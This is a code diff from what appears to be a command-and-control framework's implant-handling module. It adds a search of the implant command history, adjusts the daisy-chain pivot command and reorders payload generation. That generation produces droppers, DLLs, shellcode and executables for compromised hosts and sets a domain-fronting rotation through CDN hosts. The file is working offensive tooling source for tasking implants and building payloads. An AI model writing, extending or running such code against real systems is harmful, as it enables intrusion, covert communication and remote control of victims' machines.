@@ -39,6 +39,9 @@ def handle_sharp_command(command, user, randomuri, implant_id):
     if command.startswith("searchhelp"):
         do_searchhelp(user, command, randomuri)
         return
+    elif command.startswith("searchhistory"):
+        do_searchhistory(user, command, randomuri)
+        return
     elif command.startswith("upload-file"):
         do_upload_file(user, command, randomuri)
         return
@@ -123,6 +126,14 @@ def do_searchhelp(user, command, randomuri):
     for line in helpful:
         if searchterm in line.lower():
             print(Colours.GREEN + line)
+
+
+def do_searchhistory(user, command, randomuri):
+    searchterm = (command).replace("searchhistory ", "")
+    with open('%s/.implant-history' % PoshProjectDirectory) as hisfile:
+        for line in hisfile:
+            if searchterm in line.lower():
+                print(Colours.GREEN + line.replace("+", ""))
 
 
 def do_upload_file(user, command, randomuri):
@@ -332,11 +343,13 @@ def do_help(user, command, randomuri):
 def do_shell(user, command, randomuri):
     new_task(command, user, randomuri)
 
+
 def do_rotation(user, command, randomuri):
     domain = input("Domain or URL in array format: \"https://www.example.com\",\"https://www.example2.com\" ")
     domainfront = input("Domain front URL in array format: \"fjdsklfjdskl.cloudfront.net\",\"jobs.azureedge.net\" ")
     new_task("dfupdate %s" % domainfront, user, randomuri)
     new_task("rotate %s" % domain, user, randomuri)
+
 
 def do_sharpwmi_execute(user, command, randomuri):
     style = Style.from_dict({'': '#80d130'})
@@ -424,7 +437,7 @@ def do_startdaisy(user, command, randomuri):
 
     urls = get_allurls().replace(" ", "")
     useragent = UserAgent
-    command = f"invoke-daisychain \"{bind_ip}\" \"{bind_port}\" \"{upstream_url}\" \"{domain_front}\" \"{proxy_url}\" \"{proxy_user}\" \"{proxy_pass}\" \"{useragent}\" {urls}"
+    command = f"invoke-daisychain \"{bind_ip}\" \"{bind_port}\" {upstream_url} {domain_front} \"{proxy_url}\" \"{proxy_user}\" \"{proxy_pass}\" \"{useragent}\" {urls}"
 
     new_task(command, user, randomuri)
     update_label("DaisyHost", randomuri)
@@ -438,11 +451,11 @@ def do_startdaisy(user, command, randomuri):
         daisyhost = get_implantdetails(randomuri)
         proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
         C2 = get_c2server_all()
-        urlId = new_urldetails(name, f"http://{bind_ip}:{bind_port}", C2.DomainFrontHeader, proxy_url, proxy_user, proxy_pass, cred_expiry)
-        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?d" % get_newimplanturl(), PayloadsDirectory, PowerShellProxyCommand = proxynone, URLID = urlId)
+        urlId = new_urldetails(name, f"\"http://{bind_ip}:{bind_port}\"", "\"\"", proxy_url, proxy_user, proxy_pass, cred_expiry)
+        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?d" % get_newimplanturl(), PayloadsDirectory, PowerShellProxyCommand=proxynone, URLID=urlId)
         newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (upstream_url), "$pid;%s@%s" % (daisyhost.User, daisyhost.Domain))
-        newPayload.CreateRaw(name)
         newPayload.CreateDroppers(name)
+        newPayload.CreateRaw(name)
         newPayload.CreateDlls(name)
         newPayload.CreateShellcode(name)
         newPayload.CreateEXE(name)
